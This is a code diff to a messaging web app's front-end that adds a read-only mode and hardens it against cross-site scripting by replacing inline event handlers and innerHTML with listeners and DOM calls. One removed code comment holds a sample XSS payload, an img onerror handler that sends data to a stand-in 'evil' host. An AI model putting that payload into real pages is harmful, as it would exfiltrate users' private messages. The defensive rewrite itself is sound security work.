@@ -4928,7 +4928,7 @@ body::after {
   }
 
   function conversationSupportsOutbound(convo) {
-    if (!convo) return false;
+    if (!convo || appStatus.read_only === true) return false;
     const platform = sourcePlatformOf(convo);
     return platform === 'sms'
       || (platform === 'whatsapp' && whatsAppStatus.connected)
@@ -4936,11 +4936,11 @@ body::after {
   }
 
   function isLeaveableWhatsAppGroup(convo) {
-    return !!(convo && convo.IsGroup && sourcePlatformOf(convo) === 'whatsapp');
+    return appStatus.read_only !== true && !!(convo && convo.IsGroup && sourcePlatformOf(convo) === 'whatsapp');
   }
 
   function conversationSupportsMediaOutbound(convo) {
-    return !!convo && (
+    return appStatus.read_only !== true && !!convo && (
       sourcePlatformOf(convo) === 'sms'
       || (sourcePlatformOf(convo) === 'whatsapp' && whatsAppStatus.connected)
       || (sourcePlatformOf(convo) === 'signal' && signalStatus.connected)
@@ -5427,8 +5427,9 @@ body::after {
 
   function refreshComposeRouteUI() {
     if (!activeConversation) {
-      $composeInput.disabled = false;
-      $attachBtn.disabled = false;
+      const canWrite = appStatus.read_only !== true;
+      $composeInput.disabled = !canWrite;
+      $attachBtn.disabled = !canWrite;
       $attachBtn.title = 'Attach media';
       return;
     }
@@ -6219,11 +6220,8 @@ body::after {
   }
 
   function escapeHtml(str) {
-    // Escape all HTML-significant characters including quotes.
-    // The browser-default div.textContent/div.innerHTML escapes <, >, &, but
-    // NOT ' or ", which breaks attribute-value and JS-string-literal contexts
-    // (onclick="foo('${untrusted}')"). Escape quotes explicitly so the same
-    // helper is safe for every context we use it in.
+    // Escape HTML text and quoted-attribute contexts. Untrusted values must
+    // never be interpolated into JavaScript source or inline event handlers.
     return String(str == null ? '' : str)
       .replace(/&/g, '&amp;')
       .replace(/</g, '&lt;')
@@ -6310,7 +6308,7 @@ body::after {
 
   function hasRenderableLinkPreview(preview) {
     if (!preview || typeof preview !== 'object') return false;
-    return !!(preview.title || preview.description || preview.image_url || preview.site_name);
+    return !!(preview.title || preview.description || preview.site_name);
   }
 
   async function fetchLinkPreview(url) {
@@ -6341,9 +6339,7 @@ body::after {
 
   function renderLinkPreviewHTML(preview) {
     const site = preview.site_name || preview.domain || '';
-    const image = preview.image_url
-      ? `<div class="msg-link-preview-media"><img src="${escapeHtml(preview.image_url)}" alt="" loading="lazy" referrerpolicy="no-referrer"></div>`
-      : '';
+    const image = '';
     const description = preview.description
       ? `<div class="msg-link-preview-desc">${escapeHtml(preview.description)}</div>`
       : '';
@@ -6756,13 +6752,13 @@ body::after {
     }
   }
 
-  function buildEmojiFullPanelHTML(messageId) {
-    let html = '<div class="emoji-search"><input type="text" placeholder="Search emoji..." oninput="filterEmojis(event, \'' + messageId + '\')"></div>';
-    html += `<div class="emoji-grid" id="emoji-grid-${messageId}">`;
+  function buildEmojiFullPanelHTML() {
+    let html = '<div class="emoji-search"><input type="text" placeholder="Search emoji..."></div>';
+    html += '<div class="emoji-grid">';
     EMOJI_CATEGORIES.forEach(cat => {
       html += `<div class="emoji-cat-label">${cat.name}</div>`;
       cat.emojis.forEach(e => {
-        html += `<button data-emoji="${e}" data-name="${escapeHtml(EN[e] || '')}" onclick="sendReactionFromGrid(this, '${messageId}')">${e}</button>`;
+        html += `<button data-emoji="${e}" data-name="${escapeHtml(EN[e] || '')}">${e}</button>`;
       });
     });
     html += '</div>';
@@ -6773,7 +6769,14 @@ body::after {
     const panel = document.getElementById('emoji-full-' + messageId);
     if (!panel) return null;
     if (panel.dataset.hydrated === 'true') return panel;
-    panel.innerHTML = buildEmojiFullPanelHTML(messageId);
+    panel.innerHTML = buildEmojiFullPanelHTML();
+    const search = panel.querySelector('.emoji-search input');
+    if (search) {
+      search.addEventListener('input', event => filterEmojis(event, messageId));
+    }
+    panel.querySelectorAll('.emoji-grid button[data-emoji]').forEach(button => {
+      button.addEventListener('click', () => sendReactionFromGrid(button, messageId));
+    });
     panel.dataset.hydrated = 'true';
     return panel;
   }
@@ -6849,7 +6852,7 @@ body::after {
           const origName = original ? (original.SenderName || 'You') : '';
           const origBody = original ? (original.Body || 'Media') : 'Original message';
           const truncBody = origBody.length > 60 ? origBody.substring(0, 60) + '\u2026' : origBody;
-          html += `<div class="msg-reply-preview" data-reply-id="${escapeHtml(m.ReplyToID)}" onclick="scrollToMessage('${escapeHtml(m.ReplyToID)}')"><span class="reply-author">${escapeHtml(origName)}</span><span class="reply-body">${escapeHtml(truncBody)}</span></div>`;
+          html += `<div class="msg-reply-preview" data-reply-id="${escapeHtml(m.ReplyToID)}"><span class="reply-author">${escapeHtml(origName)}</span><span class="reply-body">${escapeHtml(truncBody)}</span></div>`;
         }
 
         if (!m.IsFromMe && m.SenderName) {
@@ -6870,7 +6873,7 @@ body::after {
           if (hasMediaID && isImage) {
             html += `<div class="msg-media">`;
             html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(m.MessageID)}" data-kind="image"><div class="spinner"></div><span class="msg-media-loading-text">Fetching image...</span></div>`;
-            html += `<img src="${mediaSrc}" alt="Image" loading="lazy" decoding="async" onload="handleMediaLoad(this)" onerror="handleMediaError(this, 'image')" onclick="showFullscreen(this.src,'image')">`;
+            html += `<img class="msg-media-image" src="${mediaSrc}" alt="Image" loading="lazy" decoding="async">`;
             html += `</div>`;
           } else if (hasMediaID && isAudio) {
             html += `<div class="msg-media">`;
@@ -6882,7 +6885,7 @@ body::after {
           } else if (hasMediaID && isVideo) {
             html += `<div class="msg-media">`;
             html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(m.MessageID)}" data-kind="video"><div class="spinner"></div><span class="msg-media-loading-text">Fetching video...</span></div>`;
-            html += `<video src="${mediaSrc}" preload="none" controls playsinline style="display:none" onloadeddata="this.style.display='block';handleMediaLoad(this)" onerror="handleMediaError(this, 'video')" onclick="event.stopPropagation()"></video>`;
+            html += `<video class="msg-media-video" src="${mediaSrc}" preload="none" controls playsinline style="display:none"></video>`;
             html += `</div>`;
           } else if (!hasMediaID && (isImage || isAudio || isVideo)) {
             const icon = isImage ? '\uD83D\uDDBC\uFE0F' : (isAudio ? '\uD83C\uDFA4' : '\uD83C\uDFA5');
@@ -6917,7 +6920,7 @@ body::after {
         // accept arbitrary strings as reaction "text" at the protocol level —
         // whatsmeow's reaction.GetText() and signal-cli's reaction.Emoji are
         // raw bytes, not validated graphemes. A crafted reaction like
-        //   <img src=x onerror="fetch('https://evil/'+btoa(...))">
+        //   a crafted image element with an error-handler payload
         // rendered via innerHTML without escaping would fire on paint and
         // exfiltrate the entire local message store (same-origin access to
         // /api/messages). Always escape.
@@ -6945,17 +6948,15 @@ body::after {
         html += `<button class="action-reply" title="Reply"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 17 4 12 9 7"/><path d="M20 18v-2a4 4 0 0 0-4-4H4"/></svg></button>`;
         html += `</div>`;
 
-        // Emoji picker (hidden, toggled by react button). MessageID is
-        // server-assigned (e.g. "whatsapp:<stanzaID>") but still goes through
-        // escapeHtml defensively since it's interpolated into both attribute
-        // values and onclick JS string literals.
+        // Emoji picker (hidden, toggled by react button). MessageID remains
+        // data only; event listeners close over the original value below.
         const safeMsgId = escapeHtml(m.MessageID);
         html += `<div class="emoji-picker" id="emoji-${safeMsgId}">`;
         QUICK_EMOJIS.forEach(e => {
           const safeEmoji = escapeHtml(e);
-          html += `<button onclick="sendReaction('${safeMsgId}','${safeEmoji}')">${safeEmoji}</button>`;
+          html += `<button data-emoji="${safeEmoji}">${safeEmoji}</button>`;
         });
-        html += `<button class="emoji-plus" data-msg-id="${safeMsgId}" onclick="toggleFullEmojiPanel(event, '${safeMsgId}')">+</button>`;
+        html += `<button class="emoji-plus" data-msg-id="${safeMsgId}">+</button>`;
         html += '</div>';
 
         // Full emoji panel is hydrated on demand instead of for every message upfront.
@@ -6963,6 +6964,33 @@ body::after {
 
         el.innerHTML = html;
         el.dataset.msgId = m.MessageID;
+
+        const replyPreview = el.querySelector('.msg-reply-preview');
+        if (replyPreview) {
+          replyPreview.addEventListener('click', () => scrollToMessage(m.ReplyToID));
+        }
+        const mediaImage = el.querySelector('.msg-media-image');
+        if (mediaImage) {
+          mediaImage.addEventListener('load', () => handleMediaLoad(mediaImage));
+          mediaImage.addEventListener('error', () => handleMediaError(mediaImage, 'image'));
+          mediaImage.addEventListener('click', () => showFullscreen(mediaImage.src, 'image'));
+        }
+        const mediaVideo = el.querySelector('.msg-media-video');
+        if (mediaVideo) {
+          mediaVideo.addEventListener('loadeddata', () => {
+            mediaVideo.style.display = 'block';
+            handleMediaLoad(mediaVideo);
+          });
+          mediaVideo.addEventListener('error', () => handleMediaError(mediaVideo, 'video'));
+          mediaVideo.addEventListener('click', event => event.stopPropagation());
+        }
+        el.querySelectorAll('.emoji-picker button[data-emoji]').forEach(button => {
+          button.addEventListener('click', () => sendReaction(m.MessageID, button.dataset.emoji || ''));
+        });
+        const emojiPlus = el.querySelector('.emoji-plus');
+        if (emojiPlus) {
+          emojiPlus.addEventListener('click', event => toggleFullEmojiPanel(event, m.MessageID));
+        }
 
         // Action bar: React button → toggle emoji picker
         el.querySelector('.action-react').addEventListener('click', (e) => {
@@ -7017,18 +7045,22 @@ body::after {
           <div class="draft-label">AI Draft</div>
           <textarea class="draft-text" rows="2"></textarea>
           <div class="draft-actions">
-            <button class="draft-discard-btn" onclick="discardDraft('${escapeHtml(draft.DraftID)}')">Discard</button>
-            <button class="draft-send-btn" onclick="sendDraft('${escapeHtml(draft.DraftID)}', this)" ${canSendActiveRoute ? '' : `disabled title="${escapeHtml(routeUnavailableMessage('send drafts', activeConversation))}"`}>Send</button>
+            <button class="draft-discard-btn">Discard</button>
+            <button class="draft-send-btn" ${canSendActiveRoute ? '' : `disabled title="${escapeHtml(routeUnavailableMessage('send drafts', activeConversation))}"`}>Send</button>
           </div>
         `;
         fragment.appendChild(draftEl);
         const ta = draftEl.querySelector('textarea');
+        const discardButton = draftEl.querySelector('.draft-discard-btn');
+        const sendButton = draftEl.querySelector('.draft-send-btn');
         ta.value = draftDisplayBody(draft);
         draftTextareasToAutosize.push(ta);
         ta.addEventListener('input', () => {
           draftEdits.set(String(draft.DraftID || ''), ta.value);
           autosizeDraftTextarea(ta);
         });
+        discardButton.addEventListener('click', () => discardDraft(String(draft.DraftID || '')));
+        sendButton.addEventListener('click', () => sendDraft(String(draft.DraftID || ''), sendButton));
       });
 
       $messagesArea.appendChild(fragment);
@@ -8233,7 +8265,8 @@ body::after {
   // Filter emojis in full panel by search term
   window.filterEmojis = function(event, messageId) {
     const query = event.target.value.toLowerCase().trim();
-    const grid = document.getElementById('emoji-grid-' + messageId);
+    const panel = document.getElementById('emoji-full-' + messageId);
+    const grid = panel ? panel.querySelector('.emoji-grid') : null;
     if (!grid) return;
     grid.querySelectorAll('button').forEach(btn => {
       if (!query) {
@@ -8374,36 +8407,48 @@ body::after {
 
   $replyClose.addEventListener('click', clearReply);
 
-  window.scrollToMessage = function(msgId) {
-    const el = document.querySelector(`[data-msg-id="${msgId}"]`);
+  function scrollToMessage(msgId) {
+    const el = Array.from(document.querySelectorAll('[data-msg-id]'))
+      .find(candidate => candidate.dataset.msgId === String(msgId || ''));
     if (el) {
       el.scrollIntoView({ behavior: 'smooth', block: 'center' });
       el.style.outline = '2px solid var(--accent)';
       setTimeout(() => { el.style.outline = ''; }, 1500);
     }
-  };
+  }
 
   // ─── Fullscreen Media Viewer ───
-  window.showFullscreen = function(src, type) {
+  function showFullscreen(src, type) {
     const overlay = document.createElement('div');
     overlay.className = 'msg-image-fullscreen';
 
+    const closeButton = document.createElement('button');
+    closeButton.className = 'fullscreen-close';
+    closeButton.textContent = '×';
+
     if (type === 'video') {
-      overlay.innerHTML = `<video src="${src}" controls autoplay playsinline></video><button class="fullscreen-close">&times;</button>`;
+      const video = document.createElement('video');
+      video.src = src;
+      video.controls = true;
+      video.autoplay = true;
+      video.playsInline = true;
+      overlay.append(video, closeButton);
       overlay.addEventListener('click', (e) => {
         if (e.target === overlay || e.target.classList.contains('fullscreen-close')) {
-          const vid = overlay.querySelector('video');
-          if (vid) vid.pause();
+          video.pause();
           overlay.remove();
         }
       });
     } else {
-      overlay.innerHTML = `<img src="${src}" alt="Full size"><button class="fullscreen-close">&times;</button>`;
+      const image = document.createElement('img');
+      image.src = src;
+      image.alt = 'Full size';
+      overlay.append(image, closeButton);
       overlay.addEventListener('click', () => overlay.remove());
     }
 
     document.body.appendChild(overlay);
-  };
+  }
 
   // ─── Keyboard Shortcuts ───
   // Helper: get ordered list of conversation items in the sidebar
